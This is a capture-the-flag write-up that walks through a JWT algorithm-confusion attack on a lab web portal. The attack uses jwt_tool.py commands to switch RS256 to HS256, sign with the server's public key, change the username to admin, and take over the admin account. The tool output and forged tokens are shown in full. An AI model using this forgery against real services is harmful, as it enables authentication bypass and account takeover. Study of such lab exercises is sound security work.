# 14 - JWT

> Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.
> 
> http://rsxc.no:20014

---

Let's look at the website:

![](00.png "")

A `test`-account is listen on the login page. And there is also an `admin`-account with no password. Let's log in using the `test`-account.

![](01.png "")

We're in some kind of portal and I guess we don't have any notes...

Looking in the footer in the portal after logging in we can see a link: "Verify your key". Looks like it links to a public key, probably the key used to verify the `JWT`. Let's download it:

```bash
$ wget http://rsxc.no:20014/jwtRS256.key.pub
```

So at this point it's pretty obvious that we're going to have to tamper with the `JWT` to gain `admin` access. Not a thing I've been playing around much with, mostly just been reading about some of the vulnerabilities out there.

I found some online tools to inspect and modify `JWT`s, but they were all so limited. So I found `jwt_tool.py` and used that to play around with the `JWT`.

So here's the first look at the `JWT` taken from the `jwt`-cookie:

```bash
$ ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO6vJME

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "RS256"

Token payload values:
[+] username = "test"
```

We can see that the `JWT` is signed using the `RS256` algorithm and that the `username` is set to `test`. Now we need to alter the token.

I struggled so much with this one and was pulling my hair! I tried the `RSA Key Confusion (CVE-2016-5431)` attack so many times and must have been doing something wrong every time... 🤦‍♂️ Then I started going down multiple rabbit holes. I even solved "JWT 2" from day 15 before this one. "JWT 2" was way easier for me! 😆

So, after learning a ***LOT*** about `JWT` (which is awesome!), and taking a long break I just basically started from scratch.

I grabbed the `JWT` from the `jwt`-cookie again and I used the following command to exploit the `RSA Key Confusion` vulnerability. This changes the signing algorithm from `RS256` to `HS256` and signs the `JWT` with the public key we downloaded earlier.

```
$ ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO6vJME -X k -pk ~/ctf-rsxc-2021/14/jwtRS256.key.pub

File loaded: /home/hag/ctf-rsxc-2021/14/jwtRS256.key.pub
jwttool_bc32d29c22fbd4305d6a6f2485890b84 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.DFCif6k8et5YtuZThSkXxjlwPfbioF4Zi-ZWPdtqVMo
```

Now we take a look at the newly signed token:

```bash
$ ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.DFCif6k8et5YtuZThSkXxjlwPfbioF4Zi-ZWPdtqVMo

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "HS256"

Token payload values:
[+] username = "test"
```

Looks good, the `alg`-field is now set to `HS256`. If the server implementation is exploitable, we should be able to use the new token just like the original one. Let's try!

I copied the `JWT`: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.DFCif6k8et5YtuZThSkXxjlwPfbioF4Zi-ZWPdtqVMo` into the `jwt`-cookie and refreshed the `http://rsxc.no:20014/portal.php`-page.

![](02.png "")

We're still logged in! That's a great sign. Ok, so now we try to change the `username`-field to `admin`:

I think this is where I messed up earlier. I was trying to change the `username`-field ***AFTER*** I did the exploit and it seems like `jwt_tool.py` doesn't like that. Probably sinde the `alg`-field has already been changed to `HS256`. So I needed to first tamper with the original token and set the `username`-field to `admin`. Then run the command with the `-X k -pk ~/ctf-rsxc-2021/14/jwtRS256.key.pub` parameters again.

Here's the full command history:

```bash
$ ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO6vJME

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "RS256"

Token payload values:
[+] username = "test"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------

$ ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO6vJME -T

Original JWT:

====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] typ = "JWT"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] username = "test"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of username is: test
Please enter new value and hit ENTER
> admin
[1] username = "admin"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_21f54836cb3daf1f11e9e31c533d1cbb - Tampered token:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO6vJME

$ ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO6vJME -X k -pk ~/ctf-rsxc-2021/14/jwtRS256.key.pub

Original JWT:

File loaded: /home/hag/ctf-rsxc-2021/14/jwtRS256.key.pub
jwttool_db315704a470c7b7be7caefc8f0125dc - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.gERmL-_S0FkZDAbIE6zrYSIP2MKc3Mrh5jxOWkM8Gyw
```

This should be our final token with admin rights; `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.gERmL-_S0FkZDAbIE6zrYSIP2MKc3Mrh5jxOWkM8Gyw`.

Let's copy, paste and reload:

![](03.png "")

Finally! 😎

## Solution

The flag is: `RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}`
